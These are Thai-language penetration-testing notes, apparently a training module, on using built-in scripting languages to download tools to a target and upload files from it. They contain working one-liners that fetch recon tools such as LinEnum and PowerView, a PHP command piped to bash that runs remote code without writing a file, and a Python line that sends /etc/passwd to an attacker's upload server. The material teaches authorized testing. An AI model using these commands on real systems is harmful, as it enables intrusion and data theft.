# Transferring Files with Code

## บทนำ

การถ่ายโอนไฟล์โดยใช้โค้ดเป็นทักษะที่สำคัญในการทดสอบเจาะระบบ เนื่องจากเครื่องเป้าหมายมักมีภาษาโปรแกรมติดตั้งอยู่แล้ว เราสามารถใช้ภาษาเหล่านี้เพื่อดาวน์โหลด อัปโหลด หรือดำเนินการต่างๆ บนระบบปฏิบัติการได้

---

## ภาษาโปรแกรมที่พบบ่อย

### บน Linux
- **Python** (เกือบทุก distribution)
- **PHP** (บนเว็บเซิร์ฟเวอร์)
- **Perl** (ติดตั้งมาตรฐาน)
- **Ruby** (พบได้บ่อย)

### บน Windows
- **JavaScript** (ผ่าน cscript)
- **VBScript** (ผ่าน cscript)
- **PowerShell** (มาตรฐาน)
- **Python** (น้อยกว่า Linux)

### ข้อเท็จจริง
- มีภาษาโปรแกรมประมาณ **700 ภาษา** ทั่วโลก
- เราสามารถเขียนโค้ดในภาษาใดก็ได้เพื่อถ่ายโอนไฟล์

---

## 1. Python

### ภาพรวม
- ภาษาโปรแกรมที่ได้รับความนิยมมาก
- มี 2 เวอร์ชันหลัก: Python 2.7 (เก่า) และ Python 3 (ปัจจุบัน)
- รองรับ **One-liner** ด้วยตัวเลือก `-c`

---

### Python 2.7 - Download

**โมดูลที่ใช้:** `urllib.urlretrieve()`

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**การทำงาน:**
1. `import urllib` - นำเข้าโมดูล urllib
2. `urllib.urlretrieve(url, filename)` - ดาวน์โหลดและบันทึกไฟล์

---

### Python 3 - Download

**โมดูลที่ใช้:** `urllib.request.urlretrieve()`

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

**ความแตกต่างจาก Python 2:**
- ต้อง import `urllib.request` แทน `urllib`
- Syntax เหมือนกันส่วนใหญ่

---

## 2. PHP

### ข้อมูลทั่วไป
- ภาษาที่ได้รับความนิยมสูงสำหรับเว็บพัฒนา
- ใช้โดย **77.4%** ของเว็บไซต์ที่รู้จักภาษา server-side (ตาม W3Techs)
- พบบ่อยมากในการทำ Offensive Operations
- รองรับ **One-liner** ด้วยตัวเลือก `-r`

---

### วิธีที่ 1: ใช้ file_get_contents() และ file_put_contents()

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

**การทำงาน:**
1. `file_get_contents()` - อ่านเนื้อหาจาก URL
2. `file_put_contents()` - บันทึกเนื้อหาลงไฟล์

---

### วิธีที่ 2: ใช้ fopen()

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

**การทำงาน:**
1. `BUFFER = 1024` - กำหนดขนาด buffer
2. `fopen(url, "rb")` - เปิดไฟล์ remote (read binary)
3. `fopen(filename, "wb")` - เปิดไฟล์ local (write binary)
4. `fread()` - อ่านข้อมูลทีละ buffer
5. `fwrite()` - เขียนข้อมูลลงไฟล์
6. `fclose()` - ปิดไฟล์

**ข้อดี:** เหมาะกับไฟล์ขนาดใหญ่ (อ่านทีละส่วน)

---

### วิธีที่ 3: PHP Pipe to Bash (Fileless)

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**การทำงาน:**
1. `@file(url)` - อ่านไฟล์จาก URL เป็น array (แต่ละบรรทัด)
2. `foreach` - วนลูปแต่ละบรรทัด
3. `echo $line` - แสดงผลแต่ละบรรทัด
4. `| bash` - ส่งต่อไปยัง bash เพื่อรันทันที

**หมายเหตุ:** `@` ใช้ซ่อน error messages

> **⚠️ ข้อกำหนด:** fopen wrappers ต้องถูก enable

---

## 3. Ruby

### ข้อมูลทั่วไป
- ภาษาโปรแกรมที่ได้รับความนิยม โดยเฉพาะใน DevOps
- รองรับ **One-liner** ด้วยตัวเลือก `-e`

### Ruby - Download File

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

**การทำงาน:**
1. `require "net/http"` - นำเข้าโมดูล HTTP
2. `URI.parse(url)` - แปลง URL string เป็น URI object
3. `Net::HTTP.get()` - ดาวน์โหลดเนื้อหา
4. `File.write()` - เขียนลงไฟล์

---

## 4. Perl

### ข้อมูลทั่วไป
- ภาษาที่มีมานาน พบบ่อยใน Unix/Linux systems
- รองรับ **One-liner** ด้วยตัวเลือก `-e`

### Perl - Download File

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

**การทำงาน:**
1. `use LWP::Simple` - นำเข้าโมดูล LWP (Library for WWW in Perl)
2. `getstore(url, filename)` - ดาวน์โหลดและบันทึกไฟล์

**ข้อดี:** Syntax สั้นและเข้าใจง่าย

---

## 5. JavaScript (Windows)

### ข้อมูลทั่วไป
- รันผ่าน **cscript.exe** (Windows Script Host)
- ใช้ **ActiveXObject** สำหรับ HTTP requests
- ต้องสร้างไฟล์ `.js` ก่อนรัน

### สร้างไฟล์ wget.js

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

**อธิบายโค้ด:**

1. **WinHttpRequest** - สร้าง HTTP request object
2. **Open()** - กำหนด method (GET) และ URL
3. **Send()** - ส่ง request
4. **ADODB.Stream** - สร้าง stream object สำหรับจัดการ binary data
5. **Type = 1** - กำหนดเป็น binary stream
6. **Write()** - เขียนข้อมูลที่ได้รับ
7. **SaveToFile()** - บันทึกเป็นไฟล์

### รันโค้ด JavaScript

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

**Parameters:**
- `/nologo` - ไม่แสดง copyright banner
- `WScript.Arguments(0)` - URL (argument แรก)
- `WScript.Arguments(1)` - ชื่อไฟล์ output (argument ที่สอง)

---

## 6. VBScript (Windows)

### ข้อมูลทั่วไป
- **Visual Basic Scripting Edition**
- พัฒนาโดย Microsoft
- ติดตั้งมาใน Windows ทุกเวอร์ชันตั้งแต่ Windows 98

### สร้างไฟล์ wget.vbs

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

**อธิบายโค้ด:**

1. **Microsoft.XMLHTTP** - สร้าง HTTP object
2. **Open()** - เปิด connection (GET method)
3. **Send()** - ส่ง request
4. **Adodb.Stream** - จัดการ binary data
5. **type = 1** - binary mode
6. **write** - เขียนข้อมูล response
7. **savetofile** - บันทึกไฟล์ (2 = overwrite ถ้ามีอยู่แล้ว)

### รันโค้ด VBScript

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

**ข้อดี:**
- ทำงานได้บน Windows เก่าๆ
- ไม่ต้องติดตั้งอะไรเพิ่ม

---

## 7. Python3 - Upload Operations

### ข้อมูลทั่วไป
การอัปโหลดไฟล์ต้องเข้าใจ functions ของภาษานั้นๆ Python3 มีโมดูล **requests** ที่ช่วยส่ง HTTP requests ได้ง่าย

---

### ตั้งค่า Upload Server

```bash
python3 -m uploadserver
# File upload available at /upload
# Serving HTTP on 0.0.0.0 port 8000
```

---

### อัปโหลดไฟล์ด้วย Python One-liner

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

---

### แยกอธิบายโค้ดทีละส่วน

```python
# 1. นำเข้าโมดูล requests
import requests 

# 2. กำหนด URL ปลายทาง
URL = "http://192.168.49.128:8000/upload"

# 3. เปิดไฟล์ที่ต้องการอัปโหลด (read binary mode)
file = open("/etc/passwd","rb")

# 4. ส่ง POST request พร้อมไฟล์
r = requests.post(URL, files={"files":file})
```

**อธิบายแต่ละบรรทัด:**

1. **import requests** - นำเข้าโมดูล requests สำหรับ HTTP operations
2. **URL** - กำหนดจุดหมายที่จะอัปโหลด
3. **open(..., "rb")** - เปิดไฟล์ในโหมด read binary
4. **requests.post()** - ส่ง HTTP POST request
   - `files={}` - dictionary สำหรับไฟล์ที่จะอัปโหลด
   - key `"files"` ต้องตรงกับที่ server คาดหวัง

---

## เปรียบเทียบภาษาต่างๆ

| ภาษา | Platform | One-liner | ติดตั้ง | Fileless | ความยาก |
|------|----------|-----------|---------|----------|---------|
| **Python** | Linux/Win | ✅ `-c` | มักมีอยู่แล้ว | ✅ | ⭐⭐ |
| **PHP** | Linux/Web | ✅ `-r` | บน web servers | ✅ | ⭐⭐ |
| **Ruby** | Linux | ✅ `-e` | มักมีอยู่แล้ว | ✅ | ⭐⭐ |
| **Perl** | Linux | ✅ `-e` | มักมีอยู่แล้ว | ✅ | ⭐⭐ |
| **JavaScript** | Windows | ❌ | มาตรฐาน | ❌ | ⭐⭐⭐ |
| **VBScript** | Windows | ❌ | มาตรฐาน | ❌ | ⭐⭐⭐ |

---

